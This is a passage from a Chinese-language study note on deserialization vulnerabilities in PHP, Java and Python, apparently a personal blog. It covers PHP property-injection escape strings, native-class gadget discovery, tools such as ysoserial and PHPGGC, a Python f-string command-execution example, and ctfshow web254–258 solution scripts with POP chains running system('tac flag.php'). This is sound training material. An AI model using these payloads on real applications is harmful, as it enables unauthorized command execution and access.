class="hljs-comment">//生成O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</span><br><br></code></pre></td></tr></table></figure></li><li><p>传参</p><p> <img src="/assets/image-20240831185310-rljruv5.png" alt="image-20240831185310-rljruv5">​</p></li></ol><p>‍</p><h4 id="减少"><a href="#减少" class="headerlink" title="减少"></a>减少</h4><ol><li><p>观察源码</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>, <span class="hljs-variable">$p</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$isVip</span>=<span class="hljs-variable language_">$this</span>-&gt;isVIP;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$isVip</span>==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag is niubi&#x27;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-variable">$obj</span>);<br>&#125;<br><br><span class="hljs-variable">$obj</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$obj</span>))&#123;<br>    <span class="hljs-variable">$o</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$obj</span>);<br>    <span class="hljs-variable">$o</span>-&gt;<span class="hljs-title function_ invoke__">login</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>根据源码得到正确的序列化语句</p><p> <code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​</p></li><li><p>但是由于源码过滤会将admin替换为hack</p><p> <code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hack&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​</p></li><li><p>由于变量长度比变量名称大而出错即只能正常运行到<code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hack</code>​而到后面的内容就会出错，所以我们尝试让后面的<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;</code>​实现逃逸并成功执行，这里就要问了，为什么不像上面一样<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​使用到最后，而是到123456（password的值）就停止了呢，这是因为123456是我们能控制的值前面停到hack最后，所以就这22位，同理构造pop链</p></li><li><p>构造代码</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<br><br><span class="hljs-variable">$u</span>=<span class="hljs-string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>;<br><span class="hljs-variable">$p</span>=<span class="hljs-string">&#x27;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span>);<br><span class="hljs-variable">$a_seri</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$a_seri_filter</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$a_seri</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a_seri_filter</span>;<br></code></pre></td></tr></table></figure></li></ol><p>‍</p><h3 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h3><p>好文：<a href="https://www.anquanke.com/post/id/264823">浅析PHP原生类-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>查询原生类的使用<a href="https://www.php.net/docs.php">PHP: Documentation</a></p><p>应用场景：</p><p>在代码中没有看到魔术方法的情况下使用的</p><h5 id="生成原生类脚本代码"><a href="#生成原生类脚本代码" class="headerlink" title="生成原生类脚本代码"></a>生成原生类脚本代码</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$classes</span> = <span class="hljs-title function_ invoke__">get_declared_classes</span>();<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;<br>    <span class="hljs-variable">$methods</span> = <span class="hljs-title function_ invoke__">get_class_methods</span>(<span class="hljs-variable">$class</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;__destruct&#x27;</span>,<br>            <span class="hljs-string">&#x27;__toString&#x27;</span>,<br>            <span class="hljs-string">&#x27;__wakeup&#x27;</span>,<br>            <span class="hljs-string">&#x27;__call&#x27;</span>,<br>            <span class="hljs-string">&#x27;__callStatic&#x27;</span>,<br>            <span class="hljs-string">&#x27;__get&#x27;</span>,<br>            <span class="hljs-string">&#x27;__set&#x27;</span>,<br>            <span class="hljs-string">&#x27;__isset&#x27;</span>,<br>            <span class="hljs-string">&#x27;__unset&#x27;</span>,<br>            <span class="hljs-string">&#x27;__invoke&#x27;</span>,<br>            <span class="hljs-string">&#x27;__set_state&#x27;</span><br>        ))) &#123;<br>            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p><img src="/assets/image-20240831193610-cby2g2l.png" alt="image-20240831193610-cby2g2l">​</p><p><img src="/assets/image-20240831193546-7af979q.png" alt="image-20240831193546-7af979q">​</p><p><img src="/assets/image-20240831193654-reiyfwx.png" alt="image-20240831193654-reiyfwx">​</p><h5 id="原生类—xss本地demo示例"><a href="#原生类—xss本地demo示例" class="headerlink" title="原生类—xss本地demo示例"></a>原生类—xss本地demo示例</h5><p>ysl_xssdemo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;k&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>pop链构造</p><p><img src="/assets/image-20240831194118-6uo31uf.png" alt="image-20240831194118-6uo31uf">​</p><p><img src="/assets/image-20240831194152-ytw7keo.png" alt="image-20240831194152-ytw7keo">​</p><h5 id="CTFshow示例"><a href="#CTFshow示例" class="headerlink" title="CTFshow示例"></a>CTFshow示例</h5><p>见环境复现</p><p>‍</p><h3 id="框架类"><a href="#框架类" class="headerlink" title="框架类"></a>框架类</h3><p>介绍了两个工具项目</p><ul><li><p>NotSoSecure(综合类)</p><p>项目地址：<a href="https://github.com/NotSoSecure/SerializedPayloadGenerator">https://github.com/NotSoSecure/SerializedPayloadGenerator</a></p><p>自己在服务器上搭建</p><p>可能会出问题这里有解决方案<a href="https://www.cnblogs.com/hanlei-/p/10950481.html">Windows Server2012 R2 无法安装.NET Framework 3.5的解决方法 - __小白菜 - 博客园 (cnblogs.com)</a></p></li><li><p>PHPGGC(单项类)</p><p>项目地址：<a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a> &#x2F;&#x2F;推荐安装在kali上</p></li></ul><p>还有对ThinkPHP&amp;Yii&amp;Laravel这三个框架的简单利用，详见环境复现</p><p>‍</p><h2 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h2><h3 id="原生反序列化"><a href="#原生反序列化" class="headerlink" title="原生反序列化"></a>原生反序列化</h3><p>JAVA常见的序列化和反序列化的方法有<code>JAVA 原生序列化</code>​和<code>JSON 类（fastjson、jackson）</code>​序列化两种方式。</p><p>两种方式做的事情都是一样的，为什么要区分开来？</p><blockquote><p>因为利用起来有所不同<br>fastjson、jackson等反序列化就用网上给的EXP、POC去测试<br>java原生类反序列化就会用到专门工具(ysoserial)去生成payload去测试</p></blockquote><p>java 序列化的数据一般会以标记<code>ac ed 00 05</code>​开头，base64 编码的特征为<code>rO0AB</code>​</p><p>黑盒发现（流量捕获到特征<code>ac ed 00 05、rO0AB</code>​）<br>白盒发现（特征类接口函数）</p><p>‍</p><h4 id="原生序列化类函数"><a href="#原生序列化类函数" class="headerlink" title="原生序列化类函数"></a>原生序列化类函数</h4><ul><li><h5 id="SnakeYaml​"><a href="#SnakeYaml​" class="headerlink" title="SnakeYaml​"></a><code>SnakeYaml</code>​</h5><p>完整的 YAML1.1 规范 Processor，支持 Java 对象的序列化&#x2F;反序列化</p><p><img src="/assets/image-20240906194551-0w29dhd.png" alt="image">​</p><p><img src="/assets/image-20240906195035-fu26709.png" alt="image">​</p><p><img src="/assets/image-20240906195014-eeb0zv5.png" alt="image">​</p></li><li><h5 id="XMLDecoder​"><a href="#XMLDecoder​" class="headerlink" title="XMLDecoder​"></a><code>XMLDecoder</code>​</h5><p>xml 语言格式序列化类函数接口</p><p><img src="/assets/image-20240906195102-hlnjnai.png" alt="image">​</p><p><img src="/assets/image-20240906195424-pyvvs6b.png" alt="image">​</p></li><li><h5 id="ObjectInputStream-readObject-​"><a href="#ObjectInputStream-readObject-​" class="headerlink" title="ObjectInputStream.readObject()​"></a><code>ObjectInputStream.readObject()</code>​</h5><p>任何类如果想要序列化必须实现 <code>java.io.Serializable</code>​ 接口</p><p><img src="/assets/image-20240906195507-7gikw7a.png" alt="image">​</p><p><img src="/assets/image-20240906200235-5zgv5i0.png" alt="image">​</p><p><img src="/assets/image-20240906195930-i238u5g.png" alt="image">​</p><p>‍</p><p><img src="/assets/image-20240906200201-1q0kwed.png" alt="image">​</p><p><img src="/assets/image-20240906200505-6uai4nn.png" alt="image">​</p><p><img src="/assets/image-20240906200421-kayznfy.png" alt="image">​</p><p><img src="/assets/image-20240906200437-u8rlp6o.png" alt="image">​</p></li></ul><p>‍</p><h4 id="利用项目"><a href="#利用项目" class="headerlink" title="利用项目"></a>利用项目</h4><ul><li><p>Yakit<br><a href="https://yaklang.com/">https://yaklang.com</a>&#x2F; &#x2F;&#x2F;集成了ysoserial工具，图形化生成，推荐使用</p></li><li><p>ysoserial<br><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a> &#x2F;&#x2F;命令生成工具，不推荐使用</p></li><li><p>SerializedPayloadGenerator<br><a href="https://github.com/NotSoSecure/SerializedPayloadGenerator">https://github.com/NotSoSecure/SerializedPayloadGenerator</a> &#x2F;&#x2F;集成了ysoserial工具，网页图形化，推荐使用</p></li></ul><p>‍</p><h4 id="JSON-类反序列化"><a href="#JSON-类反序列化" class="headerlink" title="JSON 类反序列化"></a>JSON 类反序列化</h4><ol><li><p>Jackson</p><p> 当下流行的json解释器，主要负责处理Json的序列化和反序列化。<br> 历史漏洞：<a href="https://avd.aliyun.com/search?q=Jackson">https://avd.aliyun.com/search?q=Jackson</a></p><p> <img src="/assets/image-20240906160647-khovgvr.png" alt="image">​</p><p> <img src="/assets/image-20240906160708-feu51s2.png" alt="image">​</p><p> <img src="/assets/image-20240906160726-y2cf5ug.png" alt="image">​</p><p> <img src="/assets/image-20240906160805-p7s2rx9.png" alt="image">​</p></li><li><p>FastJson（有环境复现）</p><p> 阿里巴巴公司开源的json解析器，它可以解析JSON格式的字符串，支持将JavaBean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p><p> 历史漏洞：<a href="https://avd.aliyun.com/search?q=fastjson">https://avd.aliyun.com/search?q=fastjson</a></p><p> <img src="/assets/image-20240906160839-85do8vl.png" alt="image">​</p><p> <img src="/assets/image-20240906160911-b2tzs1u.png" alt="image">​</p><p> <img src="/assets/image-20240906160924-xdbazlz.png" alt="image">​</p><p> <img src="/assets/image-20240906160940-1lajn0w.png" alt="image">​</p></li><li><p>XStream</p><p> 开源Java类库，能将对象序列化成XML或XML反序列化为对象<br> 历史漏洞：<a href="https://avd.aliyun.com/search?q=XStream">https://avd.aliyun.com/search?q=XStream</a></p><p> <img src="/assets/image-20240906161025-5u7sm39.png" alt="image">​</p><p> <img src="/assets/image-20240906161038-6rseah1.png" alt="image">​</p></li></ol><p>‍</p><p>‍</p><h2 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h2><p>‍</p><h3 id="PYC-反编译文件出源码"><a href="#PYC-反编译文件出源码" class="headerlink" title="PYC - 反编译文件出源码"></a>PYC - 反编译文件出源码</h3><pre><code class="hljs">pyc 文件是 py 文件编译后生成的字节码文件 (byte code)，pyc 文件经过 python 解释器最终会生成机器码运行。因此 pyc 文件是可以跨平台部署的，类似 Java 的.class 文件，一般 py 文件改变后，都会重新生成 pyc 文件。</code></pre><p>‍</p><p>‍</p><h3 id="常用-反-序列化函数"><a href="#常用-反-序列化函数" class="headerlink" title="常用 (反) 序列化函数"></a>常用 (反) 序列化函数</h3><ul><li>pickle.dump (obj, file) : 将对象序列化后保存到文件</li><li>pickle.load (file) : 将文件序列化内容反序列化为对象</li><li>pickle.dumps (obj) : 将对象序列化成字符串格式的字节流</li><li>pickle.loads (bytes_obj) : 将字符串字节流反序列化为对象</li><li>PyYAML yaml.load()</li><li>JSON json.loads(s)</li><li>marsha</li></ul><p>‍</p><h3 id="魔术方法-1"><a href="#魔术方法-1" class="headerlink" title="魔术方法"></a>魔术方法</h3><ul><li><p>反序列化时调用：</p><ul><li><p>reduce () 反序列化时调用</p></li><li><p>reduce_ex () 反序列化时调用</p><ul><li>发现前面这两个同时都有的时候，执行 reduce_ex 里面的，不执行 reduce 的</li></ul></li><li><p>setstate () 反序列化时调用（类似于 php 的 isset 被设置）</p><ul><li>这个小迪没测试出来，貌似有点问题</li></ul></li></ul></li><li><p>序列化时调用：</p><ul><li><p>getstate () 序列化时调用</p><ul><li>这个我测试的时候是只要有 reduce 或者 reduce_ex 就不会执行</li></ul></li></ul></li></ul><p>‍</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ul><li>白盒直接搜索关键函数即可</li><li>黑盒：Python 反序列化特征：base64 编码 前面 gA 固定（序列化数据）<br>测试：直接提交构造的 payload 测试</li></ul><p>‍</p><p>‍</p><h3 id="格式化字符串-类魔术方法引用"><a href="#格式化字符串-类魔术方法引用" class="headerlink" title="格式化字符串 - 类魔术方法引用"></a>格式化字符串 - 类魔术方法引用</h3><p>参考：<a href="https://xz.aliyun.com/t/3569?time__1311=n4+xnii=G=DQoiKDtbDs63xCqQEoi=iDg7nDQTID">Python Web之flask session&amp;格式化字符串漏洞 - 先知社区 (aliyun.com)</a></p><p>f-Strings（可控格式化字符串）</p><ul><li>这是 python3.6 之后新增的一种格式化字符串方式，其功能十分强大，可以执行字符串中包含的 python 表达式</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd">&gt;&gt;&gt; a , b = <span class="hljs-number">5</span> , <span class="hljs-number">10</span><br>&gt;&gt;&gt; f&#x27;Five plus ten is &#123;a + b&#125; and <span class="hljs-keyword">not</span> &#123;<span class="hljs-number">2</span> * (a + b)&#125;.&#x27;<br>&#x27;Five plus ten is <span class="hljs-number">15</span> and <span class="hljs-keyword">not</span> <span class="hljs-number">30</span>.&#x27;<br>&gt;&gt;&gt; f&#x27;&#123;__import__(&quot;os&quot;).system(&quot;id&quot;)&#125;&#x27;<br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br>&#x27;<span class="hljs-number">0</span>&#x27;<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h1><h2 id="PHP篇"><a href="#PHP篇" class="headerlink" title="PHP篇"></a>PHP篇</h2><p>‍</p><h3 id="PHP反序列化-POP链构造-魔术方法流程-漏洞触发条件-属性修改"><a href="#PHP反序列化-POP链构造-魔术方法流程-漏洞触发条件-属性修改" class="headerlink" title="PHP反序列化&amp;POP链构造&amp;魔术方法流程&amp;漏洞触发条件&amp;属性修改"></a>PHP反序列化&amp;POP链构造&amp;魔术方法流程&amp;漏洞触发条件&amp;属性修改</h3><ul><li><p>POP链构造训练—ctfshow</p><ol><li><p>web254-对象引用执行逻辑</p><p> <code>payload：username=xxxxxx&amp;password=xxxxxx</code>​</p><p> <img src="/assets/image-20240827192540-g17lf9a.png" alt="image">​</p><p> <img src="/assets/image-20240827192622-jtpqb8j.png" alt="image">​</p></li><li><p>web255-反序列化变量修改</p><p> <img src="/assets/image-20240827192654-p0agsw8.png" alt="image">​</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>web256-反序列化参数修改</p><p> <img src="/assets/image-20240827194138-mcp5vuv.png" alt="image">​</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;ctftest&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240827194402-ovry5xu.png" alt="image">​</p></li><li><p>web257-反序列化参数修改&amp;对象调用逻辑</p><p> <img src="/assets/image-20240827194439-n1s03oa.png" alt="image">​</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;backDoor&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;<br><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> ctfShowUser));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>web258-反序列化参数修改&amp;对象调用逻辑&amp;正则</p><p> <img src="/assets/image-20240827194530-2c5lrey.png" alt="image">​</p><p> <img src="/assets/image-20240827194555-lf7201b.png" alt="image">​</p><p> <img src="/assets/image-20240827194608-w7qma87.png" alt="image">​</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;backDoor&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>());<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:11&#x27;</span>,<span class="hljs-string">&#x27;:+11&#x27;</span>,<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:8&#x27;</span>,<span class="hljs-string">&#x27;:+8&#x27;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ol></li></ul><p>‍</p><h3 id="PHP反序列化-原生类TIPS-CVE绕过漏洞-属性类型特征"><a 